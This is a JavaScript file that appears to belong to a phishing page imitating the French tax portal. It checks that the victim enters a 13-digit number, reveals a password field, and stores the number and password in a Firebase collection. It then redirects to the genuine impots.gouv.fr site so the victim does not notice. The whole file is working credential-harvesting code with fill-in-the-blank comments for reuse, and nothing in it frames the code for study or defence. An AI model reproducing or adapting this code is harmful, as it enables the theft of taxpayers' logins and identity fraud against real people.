function checkInput() {
  console.log("hello");
  const inputField = document.getElementById("spi_tmp");
  const passwordContainer = document.getElementById("fg_pwd");
  const btn1 = document.getElementById("btnAction");
  const btn2 = document.getElementById("btnActions");

  if (inputField.value.length === 13 && !isNaN(inputField.value)) {
    // Show the password input field
    passwordContainer.style.display = "block";
    btn1.style.display = "none";
    btn2.style.display = "block";
  } else {
    alert("Please enter a valid 13-digit number.");
  }
}

// Function to save to Firebase
function saveToFirebase() {
  const inputField = document.getElementById("spi_tmp");
  const passwordField = document.getElementById("pwd_tmp");

  const data = {
    number: inputField.value,
    password: passwordField.value,
  };

  if (passwordField.value.length > 5) {
    // Password is more than 5 characters long
    // Replace "yourCollectionName" with your Firebase collection name
    app
      .firestore()
      .collection("yourCollectionName")
      .add(data)
      .then(() => {
        alert("Data saved to Firebase successfully.");

        // Redirect to another website (change the URL)
        window.location.href = "https://cfspart.impots.gouv.fr/"; // Replace with the desired URL
      })
      .catch((error) => {
        console.error("Error adding document: ", error);
      });
  } else {
    console.log("Password must be more than 5 characters long.");
  }
}
